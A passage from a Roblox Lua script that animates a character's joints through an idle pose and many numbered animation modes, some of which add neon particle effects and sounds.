								LeftHip.C0 = Clerp(LeftHip.C0, CF(-1*SIZE, -0.8*SIZE, -0.3*SIZE) * ANGLES(RAD(-10), RAD(-80), RAD(0)) * ANGLES(RAD(-1 * SIN(SINE / 6)), RAD(0), RAD(0)), 1 / 5)
							else
								RootJoint.C0 = Clerp(RootJoint.C0, ROOTC0 * CF(0, 0, 0 ) * ANGLES(RAD(15), RAD(0), RAD(0)), 1 / 5)
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0 , 0 + ((1) - 1)) * ANGLES(RAD(15), RAD(0), RAD(0)), 1 / 5)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(180 - 4 * COS(SINE / 6)), RAD(0), RAD(15 + 10 * COS(SINE / 12))) * RIGHTSHOULDERC0, 1 / 5)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(35 - 4 * COS(SINE / 6)), RAD(0), RAD(-45 - 10 * COS(SINE / 12))) * LEFTSHOULDERC0, 1 / 5)
								RightHip.C0 = Clerp(RightHip.C0, CF(1, -0.3, -0.7) * ANGLES(RAD(-25 + 5 * SIN(SINE / 12)), RAD(90), RAD(0)) * ANGLES(RAD(-1 * SIN(SINE / 6)), RAD(0), RAD(0)), 1 / 5)
								LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -0.8, -0.3) * ANGLES(RAD(-10), RAD(-80), RAD(0)) * ANGLES(RAD(-1 * SIN(SINE / 6)), RAD(0), RAD(0)), 1 / 5)
							end
						elseif TORSOVELOCITY < 1 and HITFLOOR ~= nil and ATTACK == false then
							ANIM = "Idle"
							DOUBLED = false
							READYTODOUBLE = false
							if MODE == 1 then
								RightHip.C0 = Clerp(RightHip.C0,CFrame.new(1,-0.25,-0.5)*CFrame.Angles(math.rad(0),math.rad(90),math.rad(0))*CFrame.Angles(math.rad(-2.5),math.rad(0),math.rad(-10)),.1)
								LeftHip.C0 = Clerp(LeftHip.C0,CFrame.new(-1,-1,0)*CFrame.Angles(math.rad(0),math.rad(-90),math.rad(0))*CFrame.Angles(math.rad(-2.5),math.rad(0),math.rad(10)),.1)
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0*CFrame.new(0,0,1.5 + 0.1 * math.cos(sine / 28))*CFrame.Angles(math.rad(0 - 1 * math.cos(sine / 34)),math.rad(0),math.rad(0)),.1)
								Neck.C0 = Clerp(Neck.C0,NECKC0*CFrame.Angles(math.rad(15),math.rad(0),math.rad(0)),.1)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(0.75, 0.5 + 0.05 * SIN(sine / 12), -1) * ANGLES(RAD(1.5 - 1.5 * SIN(sine / 12)), RAD(0), RAD(-95)) * ANGLES(RAD(-5), RAD(-90 + 2.5 * COS(sine / 12)), RAD(0)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-0.75, 0.35 + 0.05 * SIN(sine / 12),-0.9) * ANGLES(RAD(1.5 - 1.5 * SIN(sine / 12)), RAD(0), RAD(92)) * ANGLES(RAD(0), RAD(90 - 2.5 * COS(sine / 12)), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
							elseif MODE == 2 then
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(15 - 2.5 * SIN(sine / 12)), RAD(0), RAD(0)), 0.15 / Animation_Speed)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(0.75, 0.4 - 0.1 * COS(sine / 12), -1) * ANGLES(RAD(70), RAD(0), RAD(-70)) * ANGLES(RAD(20), RAD(25), RAD(-15)) * RIGHTSHOULDERC0, 0.4 / Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1, 0.1 - 0.1 * COS(sine / 12), -0.5) * ANGLES(RAD(25), RAD(0), RAD(85)) * LEFTSHOULDERC0, 0.4 / Animation_Speed)
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(sine / 12)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.8 / Animation_Speed)
								RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.025 * COS(sine / 12), -0.01) * ANGLES(RAD(0), RAD(83), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.8 / Animation_Speed)
								LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(sine / 12), -0.01) * ANGLES(RAD(0), RAD(-83), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.8 / Animation_Speed)
							elseif MODE == 3 then
								RightHip.C0 = Clerp(RightHip.C0,CFrame.new(1,-0.25,-0.5)*CFrame.Angles(math.rad(0),math.rad(90),math.rad(0))*CFrame.Angles(math.rad(-2.5),math.rad(0),math.rad(-10)),.1)
								LeftHip.C0 = Clerp(LeftHip.C0,CFrame.new(-1,-1,0)*CFrame.Angles(math.rad(0),math.rad(-90),math.rad(0))*CFrame.Angles(math.rad(-2.5),math.rad(0),math.rad(10)),.1)
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0*CFrame.new(0,0,1.5 + 0.1 * math.cos(sine / 28))*CFrame.Angles(math.rad(0 - 1 * math.cos(sine / 34)),math.rad(0),math.rad(0)),.1)
								Neck.C0 = Clerp(Neck.C0,NECKC0*CFrame.Angles(math.rad(15),math.rad(0),math.rad(0)),.1)
								RightShoulder.C0 = Clerp(RightShoulder.C0,CFrame.new(1,.5,-.25)*CFrame.Angles(0,math.rad(-10),math.rad(-90))*Welds.Defaults.RightShoulder.C0,.25)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0,CFrame.new(-1.5,0.5,0)*CFrame.Angles(math.rad(10),math.rad(0),math.rad(-20 - 2.5 * math.cos(sine / 28))),.1)
							elseif MODE == 4 or MODE == 5 then
								RootJoint.C0 = Clerp(RootJoint.C0, ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(25)), 1 / Animation_Speed)
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0) * ANGLES(RAD(15 - 2.5 * SIN(SINE / 12)), RAD(-2.5 * COS(SINE / 12)), RAD(-25)), 1 / Animation_Speed)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(0.75, 0.5 + 0.05 * SIN(SINE / 12), -1) * ANGLES(RAD(1.5 - 1.5 * SIN(SINE / 12)), RAD(0), RAD(-95)) * ANGLES(RAD(-5), RAD(-90 + 2.5 * COS(SINE / 12)), RAD(0)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-0.75, 0.35 + 0.05 * SIN(SINE / 12),-0.9) * ANGLES(RAD(1.5 - 1.5 * SIN(SINE / 12)), RAD(0), RAD(92)) * ANGLES(RAD(0), RAD(90 - 2.5 * COS(SINE / 12)), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
								RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), 0) * ANGLES(RAD(0), RAD(65), RAD(0)) * ANGLES(RAD(-2), RAD(0), RAD(0)), 1 / Animation_Speed)
								LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), 0) * ANGLES(RAD(0), RAD(-100), RAD(0)) * ANGLES(RAD(-5), RAD(0), RAD(0)), 1 / Animation_Speed)
							elseif MODE == 6 then
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(sine / 12)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(sine / 12)), RAD(0), RAD(0)), 0.15 / Animation_Speed)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.55, 0.5, 0.5) * ANGLES(RAD(250), RAD(20), RAD(-80))* RIGHTSHOULDERC0, 1 / Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0,CFrame.new(-1.5*S,.5*S,0)*CFrame.Angles(math.rad(5 * math.cos(sine / 24)),0,math.rad(-10 - 5.5 * math.cos(sine / 34)))*Welds.Defaults.LeftShoulder.C0,.25)
								RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(sine / 12), -0.01) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
								LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(sine / 12), -0.01) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
							elseif MODE == 7 then
								RootJoint.C0 = Clerp(RootJoint.C0,Welds.Defaults.RootJoint.C0*CFrame.new(0 + .5 * math.cos(sine/50),0,0 - .5 * math.sin(sine/50))*CFrame.Angles(math.rad(-25+5*math.sin(sine/50)),0,0),.7/3)
								Neck.C0 = Clerp(Neck.C0,Welds.Defaults.Neck.C0*CFrame.new(0,0 ,0 + ((1) - 1)) * CFrame.Angles(math.rad(30+5*math.sin(sine/50)),math.rad(0),math.rad(0)),0.7/3)
								RightShoulder.C0 = Clerp(RightShoulder.C0,CFrame.new(1.55, 0.5, 0.5) * CFrame.Angles(math.rad(250), math.rad(20), math.rad(-80))* RIGHTSHOULDERC0, 1 / 3)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0,CFrame.new(-1.5,0.5,0) * CFrame.Angles(math.rad(-20 + 8.5 * math.cos(sine/50)),math.rad(0),math.rad(-25 - 5 * math.cos(sine/25))) * LEFTSHOULDERC0,0.7/3)
								RightHip.C0 = Clerp(RightHip.C0,CFrame.new(1,-0.5,-0.5) * CFrame.Angles(math.rad(-5 + 9 * math.cos(sine/74)),math.rad(80),math.rad(0)) * CFrame.Angles(math.rad(0 + 5 * math.cos(sine/37)),math.rad(0),math.rad(0)),0.7/3)
								LeftHip.C0 = Clerp(LeftHip.C0,CFrame.new(-1,-1,0) * CFrame.Angles(math.rad(13 - 9 * math.cos(sine/54)),math.rad(-80),math.rad(0)) * CFrame.Angles(math.rad(0 - 5 * math.cos(sine/41)),math.rad(0),math.rad(0)),0.7/3)
							elseif MODE == 8 then
								WACKYEFFECT({TIME = MATHR(15,25)*2, EffectType = "Sphere", Size = VT(3 + 2 * COS(SINE/4),3 + 2 * COS(SINE/4),3 + 2 * COS(SINE/4)), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = -11, CFrame = CF(RootPart.Position-VT(MATHR(-20,20),2,MATHR(-20,20))), MoveToPos = Torso.Position+VT(0,MATHR(45,145)/1.5,0), RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = Color3.fromRGB(0,math.random(0,255),0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
								WACKYEFFECT({TIME = MATHR(0,22), EffectType = "Sphere", Size = VT(2 + 2 * COS(SINE/4),5 + 2 * COS(SINE/4),2 + 2 * COS(SINE/4)), Size2 = VT(-3,-6,-4), Transparency = 0, Transparency2 = 1, CFrame = RightArm.CFrame*CF(0,-1,0) * ANGLES(RAD(MATHR(-360,360)), RAD(MATHR(-360,360)), RAD(MATHR(-360,360))), MoveToPos = nil, RotationX = 0, RotationY = MATHR(-22,22), RotationZ = 0, Material = "Neon", Color = Color3.fromRGB(0,math.random(0,255),0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
								WACKYEFFECT({Time = MATHR(15,65),EffectType = "Slash", Size = VT(0,0.05,0), Size2 = VT(0.0625,0.015,0.0625)*MATHR(1,8), Transparency = 0, Transparency2 = 1, CFrame = RootPart.CFrame*CF(0,-2,0)*CFrame.Angles(math.rad(math.random(-5,5)),math.rad(math.random(-360,360)),math.rad(math.random(-5,5))), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = Color3.fromRGB(0,math.random(0,255),0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})	
								if MATHR(1,10) == 1 then
									Neck.C0=Clerp(Torso.Neck.C0,NECKC0*CFrame.Angles(RAD(23 + MATHR(-5,5)),RAD(MATHR(-5,5)),RAD(22 + MATHR(-5,5))),1)
								end
								if math.random(1,8) == 1 then
									Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(MATHR(-87498,12093847)), RAD(MATHR(-123456,3746525)), RAD(MATHR(-2134567876,98764356))), 0.15 / Animation_Speed)
								end
								if(math.random(1,4)==1)then
									RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(MATHR(-99999999,99999999)), RAD(MATHR(-99999999,99999999)), RAD(MATHR(-99999999,99999999))) * RIGHTSHOULDERC0, 0.15 / Animation_Speed)
									LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(MATHR(-99999999,99999999)), RAD(MATHR(-99999999,99999999)), RAD(MATHR(-99999999,99999999))) * LEFTSHOULDERC0, 0.15 / Animation_Speed)
								end		
								if MATHR(1,10) == 1 then
									Neck.C0=Clerp(Torso.Neck.C0,NECKC0*CFrame.Angles(RAD(23 + MATHR(-5,5)),RAD(MATHR(-5,5)),RAD(22 + MATHR(-5,5))),1)
								end
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 2 + 1 * COS(SINE / 18)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(15 - 2.5 * SIN(SINE / 12)), RAD(MATHR(-25,25)), RAD(0)), 0.15 / Animation_Speed)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(90), RAD(0), RAD(0)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-.75, 0.5, -.7) * ANGLES(RAD(0), RAD(0), RAD(90)) * LEFTSHOULDERC0, 1 / Animation_Speed)
								RightHip.C0 = Clerp(RightHip.C0, CF(1, -.5 - 0.02 * SIN(SINE / 12), -0.5) * ANGLES(RAD(-10 - 2.5 * SIN(SINE / 21)), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)
								LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.02 * SIN(SINE / 12), -0.01) * ANGLES(RAD(-20 - 2.5 * SIN(SINE / 16)), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)snap = math.random(1,72)
								snap = math.random(1,72)
								if snap == 1 then
									CreateSound(406913243,Head,3,1.3,false)
									Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(MATHR(-100000-Sick.PlaybackLoudness/7,100000+Sick.PlaybackLoudness/7)), RAD(MATHR(-99999-Sick.PlaybackLoudness/7,99999+Sick.PlaybackLoudness/7)), RAD(MATHR(-200-Sick.PlaybackLoudness/7,48375935+Sick.PlaybackLoudness/7))), 1 / Animation_Speed) 
								end						
							elseif MODE == 9 then
								local FRAME = CF(VT(Torso.Position.X+MATHR(-15,15),Torso.Position.Y,Torso.Position.Z+MATHR(-15,15)))
								MagicSphere(VT(0.6,0.6,0.6),15,FRAME,"Royal purple",VT(0.1,2,0.1),0)
								MagicSphere(VT(0.2,0.2,0.2),15,FRAME,"Really black",VT(0.1,2,0.1),0)
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.1 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(MATHR(-15, 25) - 2.5 * SIN(SINE / 12)), RAD(MATHR(-15, 25)), RAD(MATHR(-15, 25))), 1 / Animation_Speed)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.25, 0.5, 0.5) * ANGLES(RAD(-35), RAD(-25 + 2.5 * SIN(SINE / 12)), RAD(-55 + 2.5 * SIN(SINE / 12))) * RIGHTSHOULDERC0, 1 / Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5 + 0.35 * SIN(SINE / 12), 0) * ANGLES(RAD(0), RAD(0), RAD(-10 + 15 * COS(SINE / 12))) * ANGLES(RAD(0), RAD(15), RAD(0)) * LEFTSHOULDERC0, 0.15 / Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 0.5 / Animation_Speed)
								RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), 0) * ANGLES(RAD(0), RAD(80), RAD(0)) * ANGLES(RAD(-3), RAD(0), RAD(0)), 1 / Animation_Speed)
								LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), 0) * ANGLES(RAD(0), RAD(-80), RAD(0)) * ANGLES(RAD(-3), RAD(0), RAD(0)), 1 / Animation_Speed)
							elseif MODE == 10 then
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(sine / 12)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(sine / 12)), RAD(0), RAD(0)), 1 / Animation_Speed)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.25*SIZE, 0.5*SIZE, 0.5*SIZE) * ANGLES(RAD(-35), RAD(-25 + 2.5 * SIN(sine / 12)), RAD(-55 + 2.5 * SIN(sine / 12))) * RIGHTSHOULDERC0, 1 / Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.1, 0.15, -0.45) * ANGLES(RAD(80), RAD(0), RAD(80)) * ANGLES(RAD(0), RAD(45), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
								RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(sine / 12), -0.01) * ANGLES(RAD(0), RAD(80), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
								LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(sine / 12), -0.01) * ANGLES(RAD(0), RAD(-80), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
							elseif MODE == 11 then -- USC's echo animation
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, -0.03 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(-35)), 1 / 5)
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(25 + MATHR(-5,5) - 4 * COS(SINE / 12)), RAD(MATHR(-5,5)), RAD(15)), 1 / 5)
								if math.random(1,5) == 1 then
									Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 + MATHR(-25,25) - 4 * COS(SINE / 12)), RAD(MATHR(-25,25)), RAD(0)), 1.5 / Animation_Speed)	
								end
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5 + 0.025 * COS(SINE / 12), 0) * ANGLES(RAD(0), RAD(0 - 7.5 * SIN(SINE / 12)), RAD(12 + 7.5 * SIN(SINE / 12))) * RIGHTSHOULDERC0, 0.15 / 5)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5 + 0.025 * COS(SINE / 12), 0) * ANGLES(RAD(0), RAD(0 + 7.5 * SIN(SINE / 12)), RAD(-12 - 7.5 * SIN(SINE / 12))) * LEFTSHOULDERC0, 0.15 / 5)
								RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), 0) * ANGLES(RAD(0), RAD(95), RAD(0)) * ANGLES(RAD(-15), RAD(0), RAD(0)), 1 / 5)
								LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), 0) * ANGLES(RAD(0), RAD(-55), RAD(0)) * ANGLES(RAD(-12), RAD(0), RAD(0)), 1 / 5)
							elseif MODE == 12 then
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 3 + 0.5 * COS(SINE / 22)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(0)), 0.15 / Animation_Speed)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.2, 0.5 + 0.05 * SIN(SINE / 24), -0.7) * ANGLES(RAD(180), RAD(0), RAD(0)) * ANGLES(RAD(5), RAD(0), RAD(0)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-0.45, 0.5, -1) * ANGLES(RAD(90), RAD(0), RAD(90)) * LEFTSHOULDERC0, 1 / Animation_Speed)
								RightHip.C0 = Clerp(RightHip.C0, CF(1, -0.8, -0.01) * ANGLES(RAD(0), RAD(70), RAD(-20+10*COS(SINE/22))) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
								LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -0.8, -0.01) * ANGLES(RAD(0), RAD(-70), RAD(25-10*COS(SINE/22))) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
							elseif MODE == 13 then
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CFrame.new(0,0,3 - .5 * math.sin(SINE/50)) * CFrame.Angles(math.rad(20),math.rad(0),math.rad(0)),0.7/3)
								Neck.C0 = Clerp(Neck.C0,NECKC0 * CFrame.new(0,0,0) * CFrame.Angles(math.rad(20),math.rad(10*math.cos(SINE/100)),math.rad(0)),1)
								RightShoulder.C0 = Clerp(RightShoulder.C0,CFrame.new(1.5,0.5,0) * CFrame.Angles(math.rad(-41.6-4*math.sin(SINE/50)),math.rad(0),math.rad(0)) * RIGHTSHOULDERC0,0.7/3)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0,CFrame.new(-1.5,0.5,0) * CFrame.Angles(math.rad(20),math.rad(0),math.rad(-10-10*math.sin(SINE/50))) * LEFTSHOULDERC0,0.7/3)
								RightHip.C0 = Clerp(RightHip.C0,CFrame.new(1,-1,-0.01) * CFrame.Angles(math.rad(10),math.rad(80),math.rad(10+10*math.sin(SINE/50))),1/3)
								LeftHip.C0 = Clerp(LeftHip.C0,CFrame.new(-1,-1,-0.01) * CFrame.Angles(math.rad(20),math.rad(-80),math.rad(-10-10*math.sin(SINE/50))),1/3)
							elseif MODE == 14 then
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CFrame.new(0 + .5 * math.cos(sine/50),0,3 - .5 * math.sin(sine/50)),0.7/3)
								Neck.C0 = Clerp(Neck.C0,NECKC0 * CFrame.new(0,0 ,0 + ((1) - 1)) * CFrame.Angles(math.rad(20),math.rad(0),math.rad(0)),0.7/3)
								RightShoulder.C0 = Clerp(RightShoulder.C0,CFrame.new(1.5,0.5,0) * CFrame.Angles(math.rad(135 + 8.5 * math.cos(sine/50)),math.rad(0),math.rad(25)) * RIGHTSHOULDERC0,0.7/3)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0,CFrame.new(-1.5,0.5,0) * CFrame.Angles(math.rad(25 + 8.5 * math.cos(sine/50)),math.rad(0),math.rad(-25 - 5 * math.cos(sine/25))) * LEFTSHOULDERC0,0.7/3)
								RightHip.C0 = Clerp(RightHip.C0,CFrame.new(1,-0.5,-0.5) * CFrame.Angles(math.rad(-15 + 9 * math.cos(sine/74)),math.rad(80),math.rad(0)) * CFrame.Angles(math.rad(0 + 5 * math.cos(sine/37)),math.rad(0),math.rad(0)),0.7/3)
								LeftHip.C0 = Clerp(LeftHip.C0,CFrame.new(-1,-1,0) * CFrame.Angles(math.rad(-15 - 9 * math.cos(sine/54)),math.rad(-80),math.rad(0)) * CFrame.Angles(math.rad(0 - 5 * math.cos(sine/41)),math.rad(0),math.rad(0)),0.7/3)
							elseif MODE == 15 then
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(0)), 0.15 / Animation_Speed)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, -0.03) * ANGLES(RAD(180), RAD(-15), RAD(0))* RIGHTSHOULDERC0, 0.15 / Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.45, 0.4, 0.5) * ANGLES(RAD(25), RAD(0), RAD(35)) * LEFTSHOULDERC0, 0.15 / Animation_Speed)
								RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
								LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
							elseif MODE == 16 then
								RightHip.C0 = Clerp(RightHip.C0,CF(1,-1 - 0.1 * math.cos(sine / 32),0)*CFrame.Angles(math.rad(0),math.rad(90),math.rad(0))*CFrame.Angles(math.rad(-10 - 2.5 * math.cos(sine / 32)),math.rad(-20),math.rad(0)),.1)
								LeftHip.C0 = Clerp(LeftHip.C0,CF(-1,-1 - 0.1 * math.cos(sine / 32),0)*CFrame.Angles(math.rad(0),math.rad(-90),math.rad(0))*CFrame.Angles(math.rad(0),math.rad(0),math.rad(-10 + 2.5 * math.cos(sine / 32))),.1)
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0*CF(0,0,0 + 0.1 * math.cos(sine / 32))*CFrame.Angles(math.rad(10 - 2 * math.cos(sine / 32)),math.rad(0),math.rad(20)),.1)
								Neck.C0 = Clerp(Neck.C0,NECKC0*CFrame.Angles(math.rad(25 - 2.5 * math.cos(sine / 32)),math.rad(0 - 5 * math.cos(sine / 0.25)),math.rad(-20 - 5 * math.cos(sine / 0.465))),.1)
								RightShoulder.C0 = Clerp(RightShoulder.C0,CF(1.5,0.5,0)*CFrame.Angles(math.rad(10),math.rad(-20),math.rad(30 + 2.5 * math.cos(sine / 25))),.1)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0,CF(-1.5,0.5,0)*CFrame.Angles(math.rad(160),math.rad(0),math.rad(25)),.1)
							elseif MODE == 17 then
								WACKYEFFECT({Time = 12, EffectType = "Block", Size = VT(69,69,69)/69, Size2 = VT(1,1,1), Transparency = .5, Transparency2 = 1, CFrame = RightArm.CFrame*CF(0,-1.45,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color =Color3.fromRGB(0+170*Sick.PlaybackLoudness/1000,0,0+170*Sick.PlaybackLoudness/1000), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
								WACKYEFFECT({Time = 12, EffectType = "Block", Size = VT(69,69,69)/69, Size2 = VT(1,1,1), Transparency = .5, Transparency2 = 1, CFrame = LeftArm.CFrame*CF(0,-1.45,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = Color3.fromRGB(0+170*Sick.PlaybackLoudness/1000,0,0+170*Sick.PlaybackLoudness/1000), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
								WACKYEFFECT({Time = 12, EffectType = "Block", Size = VT(69,69,69)/69, Size2 = VT(1,1,1), Transparency = .5, Transparency2 = 1, CFrame = LeftLeg.CFrame*CF(0,-1.45,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = Color3.fromRGB(0+170*Sick.PlaybackLoudness/1000,0,0+170*Sick.PlaybackLoudness/1000), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
								WACKYEFFECT({Time = 12, EffectType = "Block", Size = VT(69,69,69)/69, Size2 = VT(1,1,1), Transparency = .5, Transparency2 = 1, CFrame = RightLeg.CFrame*CF(0,-1.45,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = Color3.fromRGB(0+170*Sick.PlaybackLoudness/1000,0,0+170*Sick.PlaybackLoudness/1000), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
